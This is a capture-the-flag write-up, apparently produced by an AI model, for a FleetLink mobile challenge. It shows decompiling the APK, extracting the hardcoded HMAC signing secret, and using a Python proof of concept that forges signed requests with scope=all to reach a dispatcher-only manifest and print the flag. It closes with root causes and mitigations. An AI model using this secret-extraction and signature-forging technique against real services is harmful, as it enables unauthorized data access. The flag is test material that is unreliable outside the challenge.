# Signed, Sealed, Delivered — Write-up

**Category:** Mobile / Docker  
**Difficulty:** Medium  
**Points:** 63  
**Challenge URL:** `https://web-1685d4f9c5ed19a5.web.h7tex.com/`  
**Attachment:** `fleetlink-4.1.0.apk.zip`

---

## 1. Challenge Description

> FleetLink is what our delivery drivers use to pull their trip sheets, and the backend is careful: it hands each driver their own trips and nothing else. Above all that sits the dispatcher's full fleet manifest, the one no driver is ever meant to see.
>
> **Sign for it yourself.**

The goal is clear: obtain the **dispatcher's full fleet manifest** that normal drivers are never allowed to see.

---

## 2. Reconnaissance

### 2.1 APK Analysis

Unzip the provided archive and decompile the APK:

```bash
unzip fleetlink-4.1.0.apk.zip
apktool d fleetlink-4.1.0.apk -o fleetlink_decompiled
# or better with jadx
jadx -d jadx_out fleetlink-4.1.0.apk
```

The application is extremely small. Key classes:

| Class            | Role                                      |
|------------------|-------------------------------------------|
| `MainActivity`   | UI + API call logic                       |
| `Session`        | Stores `deviceId` + base URL              |
| `Signer`         | Request signing logic                     |
| `ApiClient`      | Simple HTTP GET helper                    |

### 2.2 How the App Works

When the user clicks **"Load my trips"**, the app does the following:

1. Builds a sorted query string: `scope=mine`
2. Signs the request using `Signer.sign(...)`
3. Sends:

```
GET /api/v1/trips?scope=mine
Headers:
  X-Device-Id: <deviceId>
  X-Ts:        <unix timestamp>
  X-Sig:       <hmac signature>
```

### 2.3 Signature Algorithm (from `Signer.java`)

```java
private static final String APP_SECRET = "fleetlink_signing_pepper_v3";

public static Signed sign(String method, String path, TreeMap<String,String> params, String deviceId) {
    // 1. Build canonical query (TreeMap → sorted key=value&key=value)
    String query = ...;   // e.g. "scope=mine"

    // 2. Timestamp
    String ts = String.valueOf(System.currentTimeMillis() / 1000);

    // 3. Canonical string
    String canonical = method + "\n" + path + "\n" + query + "\n" + ts;

    // 4. Derive key
    byte[] key = SHA256(APP_SECRET + ":" + deviceId);

    // 5. HMAC-SHA256
    String sig = hex(HMAC_SHA256(key, canonical));
    ...
}
```

**Important observations:**

- The signing secret (`fleetlink_signing_pepper_v3`) is **hardcoded** in the APK → anyone can forge signatures.
- `deviceId` is part of the key derivation, but any valid-looking device ID works.
- The path and query string are included in the signature, so we can request **any path / any scope** as long as we sign correctly.

---

## 3. Backend Exploration

The root endpoint returns:

```json
{"service":"FleetLink API","version":"4.1.0"}
```

Trying the normal driver endpoint with a correctly signed request returns only two trips:

```json
{
  "trips": [
    {"id":"T-8801","from":"Depot 4","to":"Pier 12","status":"assigned"},
    {"id":"T-8802","from":"Pier 12","to":"Yard A","status":"en_route"}
  ]
}
```

Changing `scope` to `all`, `fleet`, `dispatcher`, etc. still returns the same two trips.  
This suggests the **filtering is path-based**, not only scope-based.

### Discovering the privileged endpoint

After trying several paths, we hit:

```
GET /api/v1/fleet/manifest
```

Response (even with a valid signature but `scope=mine`):

```json
{"error":"scope 'mine' cannot list the full fleet; requires scope=all (dispatcher)"}
```

This is the smoking gun. The endpoint exists and explicitly tells us what is required: **`scope=all`**.

---

## 4. Exploitation

We just need to:

1. Choose any `deviceId` (e.g. a random UUID prefixed with `flt-`)
2. Set `path = /api/v1/fleet/manifest`
3. Set `query = scope=all`
4. Compute a valid signature using the hardcoded pepper
5. Send the request

### Python PoC

```python
#!/usr/bin/env python3
import hashlib, hmac, time, uuid, json, requests

BASE = "https://web-1685d4f9c5ed19a5.web.h7tex.com"
APP_SECRET = "fleetlink_signing_pepper_v3"

device_id = "flt-" + str(uuid.uuid4())
ts = str(int(time.time()))

path  = "/api/v1/fleet/manifest"
query = "scope=all"          # required for dispatcher access

# Canonical string (must match the app exactly)
canonical = f"GET\n{path}\n{query}\n{ts}"

# Key derivation
key = hashlib.sha256(f"{APP_SECRET}:{device_id}".encode()).digest()

# Signature
sig = hmac.new(key, canonical.encode(), hashlib.sha256).hexdigest()

headers = {
    "X-Device-Id": device_id,
    "X-Ts":        ts,
    "X-Sig":       sig,
}

r = requests.get(f"{BASE}{path}?{query}", headers=headers)
print(r.status_code)
print(json.dumps(r.json(), indent=2))
```

### Result

```json
{
  "dispatcher_manifest_signing_key": "H7CTF{22a8336c-1f3b-4f75-9527-1aec6e4287ea}",
  "scope": "all"
}
```

---

## 5. Flag

```
H7CTF{22a8336c-1f3b-4f75-9527-1aec6e4287ea}
```

---

## 6. Root Cause & Lessons

| Issue | Explanation |
|-------|-------------|
| **Hardcoded signing secret** | The pepper is embedded in the client → any attacker can forge valid signatures. |
| **Insufficient authorization** | Authorization relies only on a client-controlled `scope` parameter. Once you can sign any request, you can simply request `scope=all`. |
| **Information disclosure** | The error message explicitly tells the attacker the required scope value. |

**Proper mitigations would include:**

- Never put signing secrets in the mobile client (use short-lived server-issued tokens instead).
- Perform authorization on the server based on authenticated identity / role, not on a client-supplied `scope` parameter.
- Avoid verbose error messages that leak the authorization logic.

---

## 7. Timeline (approximate)

1. Decompile APK → extract signing algorithm & secret  
2. Implement correct signer in Python  
3. Confirm normal `/api/v1/trips` works  
4. Fuzz paths → discover `/api/v1/fleet/manifest`  
5. Read error message → change to `scope=all`  
6. Profit

---

*Write-up by Grok • 27 Sep 2026*
